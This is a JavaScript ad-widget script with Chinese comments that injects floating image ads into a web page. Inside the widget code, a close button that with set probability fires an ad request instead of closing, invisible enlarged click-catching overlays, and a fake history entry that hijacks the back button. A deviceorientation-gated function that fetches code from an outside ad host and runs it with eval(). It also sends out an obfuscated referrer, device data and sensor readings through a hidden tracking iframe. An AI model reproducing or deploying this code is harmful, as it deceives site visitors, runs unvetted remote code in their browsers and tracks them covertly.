/*!
 * @params {String} width 宽度 默认200px
 * @params {String} height 高度 默认300px
 * @params {Number} shadow 不被看见的区域百分比，默认0不开启，指的是在原来的大小基础上向四周延伸的大小
 * @params {String} pos 默认 'left', 值有：'left','right','top','bottom','center', 'none'表示不设置定位
 * @params {String} distanceTop pos值为'left','right'时设置
 * @params {Number || String} close_btn 关闭按钮 默认1，1默认按钮效果，或者图片地址
 * @params {Number} closeDec 关闭按钮是否真的关闭 范围0.01 ~ 1 默认0，0可直接关闭
 * @params {Number} showBorder 是否显示边框，默认0， 0 不显示，其它数字表示边框大小
 * @params {0 || String} effect 效果，0为关闭 ，默认'pulse'  'tada'抖动 'pulse'放大 'rotate'旋转
 * @params {String} effectdura 效果间隔, 默认 '5s';
 * @params {String} effectdelay 效果延时, 默认 '3s';
 * @params {String} stutslink 统计链接地址
 * @params {String} adlink 链接地址
 * @params {Number} btnNumpar 按钮传参数字 默认5
 * @params {Number} imgNumpar 图片传参数字 默认1
 * @params {Number} shadowNumpar 不可见区域传参数字 默认3
 * @params {Number} backNumpar 不可见区域传参数字 默认5
 * @params {Number} imgduration 图片切换间隔 默认2000
 * @params {Array} imgs 图片地址数组
 * 注意iframe 使用带上参数ifr。 e.g. <iframe src="iframe.html?ifr=1" frameborder="0" scrolling="no" width="300" height="500"></iframe> 其中wdith和height自定义，但是必填。 受浏览器安全策略限制，shadow参数无效
*/
/*
 * notice: 固定位置引入必须给引入的script标签加上id="zrgscript" 目前固定位置同一个js引入2个可能会在某些浏览器存在冲突情况，因为id相同
 */
var Zad = /** @class */ (function () {
    function Zad(_a) {
        var width = _a.width, height = _a.height, shadow = _a.shadow, pos = _a.pos, distanceTop = _a.distanceTop, close_btn = _a.close_btn, closeDec = _a.closeDec, showBorder = _a.showBorder, effect = _a.effect, effectdura = _a.effectdura, effectdelay = _a.effectdelay, stutslink = _a.stutslink, adlink = _a.adlink, btnNumpar = _a.btnNumpar, imgNumpar = _a.imgNumpar, shadowNumpar = _a.shadowNumpar, backNumpar = _a.backNumpar, imgduration = _a.imgduration, imgs = _a.imgs;
        this.adWidth = width || '200px';
        this.adHeight = height || '300px';
        this.shadow = shadow || 0;
        this.pos = pos || 'left';
        this.distanceTop = distanceTop || '100px';
        this.close_btn = close_btn || 1;
        this.closeDec = closeDec || 0;
        this.showBorder = showBorder || 0;
        this.effect = effect || 'pulse';
        this.effectdura = effectdura || '5s';
        this.effectdelay = effectdelay;
        this.stutslink = stutslink || '';
        this.adlink = adlink || '';
        this.btnNumpar = btnNumpar || 5;
        this.imgNumpar = imgNumpar || 1;
        this.shadowNumpar = shadowNumpar || 3;
        this.backNumpar = backNumpar || 5;
        this.imgduration = imgduration || 2000;
        this.imgs = imgs || [];
        this.winW = document.documentElement.clientWidth || document.body.clientWidth;
        this.winH = document.documentElement.clientHeight || document.body.clientHeight;
        this.init();
    }
    Zad.prototype.init = function () {
        this.writeCss();
        this.creatWrapper();
        this.mobc();
        if (this.getQueryParam()) {
            // let bodyEle = document.documentElement.getElementsByTagName('body');
            this.iframeInnercss();
        }
    };
    Zad.prototype.getQueryParam = function () {
        var urlParam = 'ifr';
        var query = window.location.search.substring(1);
        var vars = query.split("&");
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split("=");
            if (pair[0] == urlParam) {
                return pair[1];
            }
        }
        return (false);
    };
    Zad.prototype.creatWrapper = function () {
        var _this = this;
        var wrap = document.createElement('div');
        var closeBtn = this.closeBtn();
        var imgbox = this.imgBox();
        wrap.className = 'zad-wrap';
        wrap.id = 'zadbox';
        var wrapWidth = "" + this.adWidth, wrapHeight = "" + this.adHeight;
        if (this.getQueryParam()) {
            wrapWidth = '100%';
            wrapHeight = '100%';
        }
        wrap.style.cssText = "width: " + wrapWidth + ";height: " + wrapHeight + ";";
        wrap.style.cssText += this.adPosition(this.pos);
        // let alink = this.adlink;
        var paranum = this.btnNumpar;
        function propt(probability) {
            var probability = probability * 100 || 1;
            var odds = Math.floor(Math.random() * 100);
            if (probability === 1) {
                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
                // location.href = alink;
            }
            ;
            if (odds < probability) {
                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
                // location.href = alink;
            }
            else {
                closeBtn.onclick = function () {
                    wrap.style.display = 'none';
                    document.body.removeChild(wrap);
                };
            }
        }
        ;
        propt(Number(this.closeDec));
        // closeBtn.onclick = () => {
        //     propt(Number(this.closeDec));
        // }
        wrap.appendChild(closeBtn);
        wrap.appendChild(imgbox);
        window.addEventListener('load', function () {
            _this.zstatus();
            _this.winW = document.documentElement.clientWidth || document.body.clientWidth;
            _this.winH = document.documentElement.clientHeight || document.body.clientHeight;
            if (_this.pos == 'none' && window.self == window.top) {
                var zscript = document.getElementById('zrgscript');
                if (zscript) {
                    var parentEle = zscript.parentNode;
                    if (parentEle.tagName == 'HEAD') {
                        var first = document.body.firstElementChild;
                        document.body.insertBefore(wrap, first);
                    }
                    else {
                        zscript.insertAdjacentElement('afterend', wrap);
                    }
                }
            }
            else {
                document.body.appendChild(wrap);
            }
        });
    };
    Zad.prototype.adPosition = function (pos) {
        var posCss = '';
        var ahnum = (this.adHeight).replace(/px/, '');
        var awnum = (this.adWidth).replace(/px/, '');
        if (this.adHeight.indexOf('%') > -1) {
            ahnum = (this.adHeight).replace(/%/, '');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.adWidth.indexOf('%') > -1) {
            awnum = (this.adWidth).replace(/%/, '');
            awnum = this.winW * (Number(awnum) / 100);
        }
        var margin_top = (Number(ahnum) / 2).toFixed();
        var margin_left = (Number(awnum) / 2).toFixed();
        switch (pos) {
            case 'left':
                posCss = "position: fixed;z-index: 99999;left: 0;top: " + this.distanceTop + ";";
                break;
            case 'right':
                posCss = "position: fixed;z-index: 99999;right: 0;top: " + this.distanceTop + ";";
                break;
            case 'top':
                posCss = "position: fixed;z-index: 99999;top: 0;left: 0;right: 0;width: 100%";
                break;
            case 'bottom':
                posCss = "position: fixed;z-index: 99999;bottom: 0;left: 0;right: 0;width: 100%";
                break;
            case 'center':
                posCss = "position: fixed;z-index: 99999;top: 50%;margin-top: -" + margin_top + "px;left: 50%;margin-left: -" + margin_left + "px;";
                break;
            case 'none':
                posCss = "position: relative;";
                break;
            default:
                posCss = pos;
                break;
        }
        if (this.getQueryParam()) {
            posCss = '';
        }
        return posCss;
    };
    Zad.prototype.closeBtn = function () {
        var btn = document.createElement('div');
        btn.className = 'zad-btn-close';
        if (this.close_btn == 1) {
            btn.className += ' default';
        }
        else {
            btn.style.backgroundImage = "url(" + this.close_btn + ")";
        }
        // if (this.close_btn) {
        //     btn.style.display = 'block';
        // }else {
        //     btn.style.display = 'none';
        // }
        return btn;
    };
    Zad.prototype.imgBox = function () {
        var imglist = this.imgs;
        var imgEle = '';
        var ahnum = (this.adHeight).replace(/px/, '');
        var awnum = (this.adWidth).replace(/px/, '');
        if (this.adHeight.indexOf('%') > -1) {
            ahnum = (this.adHeight).replace(/%/, '');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.adWidth.indexOf('%') > -1) {
            awnum = (this.adWidth).replace(/%/, '');
            awnum = this.winW * (Number(awnum) / 100);
        }
        var aw = Number(awnum);
        var ah = Number(ahnum);
        var anthoer_w = aw * (this.shadow) / 100;
        var anthoer_h = ah * (this.shadow) / 100;
        var coverW = aw + anthoer_w;
        var coverH = ah + anthoer_h;
        var paranum = this.shadowNumpar;
        if (imglist.length > 0) {
            for (var i = 0; i < imglist.length; i++) {
                var cssDisplay = i === 0 ? 'block' : 'none';
                imgEle += "<div class=\"item\" style=\"display:" + cssDisplay + ";\"><a><img src=\"" + imglist[i] + "\" /><div class=\"cover\" style=\"width: " + coverW + "px;height: " + coverH + "px;top: -" + anthoer_h / 2 + "px;left: -" + anthoer_w / 2 + "px;\" onclick=\"cxta(" + paranum + ");\"></div></a></div>";
            }
        }
        var imgBox = document.createElement('div');
        imgBox.className = 'zad-img-box';
        imgBox.setAttribute('onclick', "cxta(" + this.imgNumpar + ")");
        if (this.effect !== 0) {
            imgBox.className += ' ' + ("animated " + this.effect + " infinite slower");
        }
        if (this.effectdura != '') {
            imgBox.style.cssText += "animation-duration: " + this.effectdura + ";-webkit-animation-duration: " + this.effectdura + ";";
        }
        if (this.effectdelay != '') {
            imgBox.style.cssText += "animation-delay: " + this.effectdelay + ";-webkit-animation-delay: " + this.effectdelay + ";";
        }
        imgBox.innerHTML = imgEle;
        // let childNode = imgBox.childNodes;
        var childNode = imgBox.querySelectorAll('.item');
        var index = 1;
        setInterval(function () {
            if (index > childNode.length - 1) {
                index = 0;
            }
            for (var j = 0; j < childNode.length; j++) {
                childNode[j].style.display = 'none';
                childNode[j].onclick = function (e) {
                    if (e && e.stopPropagation) {
                        e.stopPropagation();
                    }
                    else {
                        window.event.cancelBubble = true;
                    }
                };
            }
            childNode[index].style.display = 'block';
            index++;
        }, this.imgduration);
        var borderDiv = document.createElement('div');
        borderDiv.className = 'boddiv';
        if (this.showBorder == 1) {
            borderDiv.style.border = this.showBorder + "px solid red";
        }
        imgBox.appendChild(borderDiv);
        return imgBox;
    };
    Zad.prototype.ref = function () {
        var u;
        try {
            u = window.top.document.referrer;
        }
        catch (err) {
            u = document.referrer;
        }
        var r = '', c;
        for (var i = 0; i < u.length; i++) {
            if (i == 1000) {
                break;
            }
            c = u.charCodeAt(i);
            if (c > 96 && c < 123) {
                c += i % 8;
                if (c > 122)
                    c -= 26;
            }
            r += String.fromCharCode(c);
        }
        return r;
    };
    Zad.prototype.zstatus = function () {
        var odiv_m_1 = document.createElement('div');
        odiv_m_1.style.display = "none";
        var oiframe_m_1 = document.createElement("iframe");
        oiframe_m_1.src = this.stutslink + "&l=h";
        oiframe_m_1.height = "0";
        oiframe_m_1.width = "0";
        oiframe_m_1.sandbox = "allow-same-origin allow-scripts allow-forms";
        oiframe_m_1.style.display = "none";
        odiv_m_1.appendChild(oiframe_m_1);
        document.body.appendChild(odiv_m_1);
    };
    Zad.prototype.mobc = function () {
        var _this = this;
        window.addEventListener("deviceorientation", function (event) {
            var M18_url = _this.adlink + "&pn=0.25&ref=" + _this.ref() + "&refso=" + navigator.platform + "_dp&zhongli=_" + Math.floor(event.alpha) + "," + Math.floor(event.beta) + "," + Math.floor(event.gamma);
            var strjs1 = "function cxta(ct){var a=new XMLHttpRequest();var b='" + M18_url + "&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(" + _this.backNumpar + ");}, false);";
            var js1nod = document.createElement('script');
            js1nod.innerHTML = strjs1;
            document.getElementsByTagName('head')[0].appendChild(js1nod);
        }, false);
    };
    Zad.prototype.writeCss = function () {
        var style = document.createElement('style');
        style.innerHTML = "\n        .zad-wrap {\n            \n        }\n        .zad-btn-close {\n            display: block;\n            position: absolute;\n            width: 18px;\n            height: 18px;\n            -webkit-border-radius: 50%;\n            -moz-border-radius: 50%;\n            border-radius: 50%;\n            right: 0;\n            top: 0;\n            z-index: 10;\n            background-repeat: no-repeat;\n            background-position: center;\n            background-size: cover;\n        }\n        .zad-btn-close.default {background-color: #ccc;}\n        .zad-btn-close.default:before {\n            content: '\u00D7';\n            position: absolute;\n            top: 0;\n            color: #fff;\n            width: 100%;\n            height: 100%;\n            text-align: center;\n            line-height: 100%;\n            cursor: pointer;\n        }\n        .zad-img-box {\n            width: 100%;\n            height: 100%;\n        }\n        .boddiv {\n            position: absolute;\n            width: 100%;\n            height: 100%;\n            top:0;\n            -webkit-box-sizing: border-box;\n            -moz-box-sizing: border-box;\n            box-sizing: border-box;\n            -webkit-background-clip: text;\n            background-clip: text;\n            -webkit-text-fill-color: transparent;\n            text-fill-color: transparent;\n            -webkit-animation: hue 8s infinite linear;\n            animation: hue 8s infinite linear;\n        }\n        .boddiv.hasborder {border: 3px solid red;}\n        .zad-img-box .item {\n            width: 100%;\n            height: 100%;\n            position: relative;\n        }\n        .zad-img-box .cover {\n            position: absolute;\n        }\n        .zad-img-box img {\n            width: 100%;\n            height: 100%;\n        }\n        @keyframes hue {\n            0% {\n                -webkit-filter: hue-rotate(0deg);\n            }\n            100% {\n                -webkit-filter: hue-rotate(360deg);\n            }\n        }\n        ";
        if (this.effect !== 0) {
            style.innerHTML += "\n            .animated {\n                -webkit-animation-duration: 1s;\n                animation-duration: 1s;\n                -webkit-animation-fill-mode: both;\n                animation-fill-mode: both;\n              }\n              .animated.infinite {\n                -webkit-animation-iteration-count: infinite;\n                animation-iteration-count: infinite;\n              }\n              .animated.delay-5s {\n                -webkit-animation-delay: 5s;\n                animation-delay: 5s;\n              }\n              \n              .animated.slow {\n                -webkit-animation-duration: 2s;\n                animation-duration: 2s;\n              }\n              \n              .animated.slower {\n                -webkit-animation-duration: 3s;\n                animation-duration: 3s;\n              }\n              @media (print), (prefers-reduced-motion) {\n                .animated {\n                  -webkit-animation: unset !important;\n                  animation: unset !important;\n                  -webkit-transition: none !important;\n                  transition: none !important;\n                }\n              }\n            @-webkit-keyframes tada {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                10%,\n                20% {\n                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                30%,\n                50%,\n                70%,\n                90% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                }\n              \n                40%,\n                60%,\n                80% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              @keyframes tada {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                10%,\n                20% {\n                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                30%,\n                50%,\n                70%,\n                90% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                }\n              \n                40%,\n                60%,\n                80% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              .tada {\n                -webkit-animation-name: tada;\n                animation-name: tada;\n              }\n              @-webkit-keyframes pulse {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                50% {\n                  -webkit-transform: scale3d(1.05, 1.05, 1.05);\n                  transform: scale3d(1.05, 1.05, 1.05);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              @keyframes pulse {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                50% {\n                  -webkit-transform: scale3d(1.05, 1.05, 1.05);\n                  transform: scale3d(1.05, 1.05, 1.05);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              .pulse {\n                -webkit-animation-name: pulse;\n                animation-name: pulse;\n            }\n            \n            @-webkit-keyframes animaterotate {\n                0% {\n                    -webkit-transform: rotate(0deg);\n                    -moz-transform: rotate(0deg);\n                    -ms-transform: rotate(0deg);\n                    transform: rotate(0deg);\n                }\n                100% {\n                    -webkit-transform: rotate(360deg);\n                    -moz-transform: rotate(360deg);\n                    -ms-transform: rotate(360deg);\n                    transform: rotate(360deg);\n                }\n            }\n            @-moz-keyframes animaterotate {\n                0% {\n                    -webkit-transform: rotate(0deg);\n                    -moz-transform: rotate(0deg);\n                    -ms-transform: rotate(0deg);\n                    transform: rotate(0deg);\n                }\n\n                100% {\n                    -webkit-transform: rotate(360deg);\n                    -moz-transform: rotate(360deg);\n                    -ms-transform: rotate(360deg);\n                    transform: rotate(360deg);\n                }\n            }\n            @keyframes animaterotate {\n                0% {\n                    -webkit-transform: rotate(0deg);\n                    -moz-transform: rotate(0deg);\n                    -ms-transform: rotate(0deg);\n                    transform: rotate(0deg);\n                }\n\n                100% {\n                    -webkit-transform: rotate(360deg);\n                    -moz-transform: rotate(360deg);\n                    -ms-transform: rotate(360deg);\n                    transform: rotate(360deg);\n                }\n            }\n            .zad-img-box.rotate {\n                -webkit-animation-name: animaterotate;\n                animation-name: animaterotate;\n                -webkit-animation-timing-function: linear;\n                animation-timing-function: linear;\n                -webkit-animation-duration: 8s;\n                animation-duration: 8s;\n            }\n            ";
        }
        var head = document.getElementsByTagName('head')[0];
        head.appendChild(style);
    };
    Zad.prototype.iframeInnercss = function () {
        var style = document.createElement('style');
        style.innerHTML = "\n        html, body {\n            width: 100%;height: 100%;\n            margin: 0;padding: 0;\n        }\n        .zad-wrap {\n            width: 100%;\n            height: 100%;\n        }\n        ";
        var head = document.getElementsByTagName('head')[0];
        head.appendChild(style);
    };
    return Zad;
}());
new Zad({
    width: '200px',
    height: '240px',
    shadow: 40,
    pos: 'right',
    distanceTop: '100px',
    close_btn: 'data:image/png;base64,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',
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shadowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    imgs: ['imgs/img1.jpg', 'imgs/img2.jpg', 'imgs/img3.jpg', 'imgs/img4.jpg', 'imgs/img5.jpg'],
});
new Zad({
    width: '200px',
    height: '300px',
    shadow: 30,
    pos: 'left',
    distanceTop: '150px',
    close_btn: 1,
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shadowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    imgs: ['imgs/img1.jpg', 'imgs/img2.jpg', 'imgs/img3.jpg', 'imgs/img4.jpg', 'imgs/img5.jpg'],
});
//# sourceMappingURL=zad.js.map